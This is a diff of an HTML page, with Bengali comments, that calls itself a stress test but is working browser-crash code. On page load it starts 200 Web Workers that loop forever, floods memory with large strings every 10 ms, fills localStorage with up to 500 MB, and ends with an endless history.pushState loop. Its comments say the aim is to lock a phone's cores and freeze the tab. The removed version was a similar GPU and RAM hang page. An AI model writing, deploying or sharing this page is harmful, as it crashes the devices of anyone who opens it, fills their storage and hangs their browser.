@@ -1,46 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Extreme Load Test</title>
-    <style>
-        /* গ্রাফিক্সের ওপর প্রচণ্ড চাপ দেওয়ার জন্য CSS */
-        .glitch {
-            width: 50px; height: 50px;
-            background: red;
-            filter: blur(10px) contrast(500%);
-            box-shadow: 0 0 50px blue;
-            animation: rotate 0.1s infinite;
-            display: inline-block;
-        }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-    </style>
+    <title>MAXIMUM STRESS TEST</title>
 </head>
-<body>
-    <h1>System Stress Testing...</h1>
-    <div id="box"></div>
+<body style="background: black; color: yellow; text-align: center;">
+    <h1 id="status">INITIALIZING FULL HIGH LOAD...</h1>
 
     <script>
-        const box = document.getElementById('box');
-        
-        // ১. ৫০০০টি অ্যানিমেটেড এলিমেন্ট জেনারেট করা (GPU Stress)
-        for (let i = 0; i < 5000; i++) {
-            const div = document.createElement('div');
-            div.className = 'glitch';
-            box.appendChild(div);
-        }
-
-        // ২. মেমোরি এবং প্রসেসর জ্যাম করার ইনফিনিট লুপ (CPU Stress)
-        function freeze() {
-            let storage = [];
-            while (true) {
-                // র‍্যাম ভর্তি করার জন্য ডেটা পুশ করা
-                storage.push(new Array(1000000).fill("HANG_TEST"));
-                console.log("Loading Graphics...");
+        // ১. মাল্টি-কোর প্রসেসর লক করা (Web Worker ম্যারাথন)
+        function startCPUBlast() {
+            const code = `
+                while(true) {
+                    let x = Math.random() * Math.random();
+                    let y = Math.atan2(Math.sin(x), Math.cos(x));
+                }
+            `;
+            const blob = new Blob([code], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            
+            // ফোনের কোর সংখ্যার চেয়ে ৫ গুণ বেশি থ্রেড চালু করা
+            for (let i = 0; i < 200; i++) {
+                new Worker(url);
             }
         }
 
-        // কিছু সময় পর প্রসেসটি শুরু হবে
-        setTimeout(freeze, 2000);
+        // ২. র‍্যাম ফ্লাডিং (RAM Flooding)
+        let memoryStash = [];
+        function floodRAM() {
+            setInterval(() => {
+                // প্রতি ১০ মিলি-সেকেন্ডে বিশাল স্ট্রিং তৈরি করে মেমোরিতে রাখা
+                let chunk = new Array(1000000).fill("SYSTEM_OVERLOAD_9999").join("");
+                memoryStash.push(chunk);
+            }, 10);
+        }
+
+        // ৩. স্টোরেজ জ্যাম (Local Storage Bomb)
+        function fillStorage() {
+            let data = "X".repeat(1024 * 1024); // 1MB data
+            let i = 0;
+            while(i < 500) { 
+                try {
+                    localStorage.setItem('crash' + i, data);
+                    i++;
+                } catch(e) { break; }
+            }
+        }
+
+        // ৪. ফুল লোড শুরু করা
+        document.getElementById('status').innerText = "FULL LOAD ACTIVE!";
+        
+        startCPUBlast();
+        floodRAM();
+        fillStorage();
+        
+        // সবশেষে ব্রাউজার ট্যাব ফ্রিজ করা
+        while(true) {
+            window.history.pushState(null, "", window.location.href);
+        }
     </script>
 </body>
 </html>
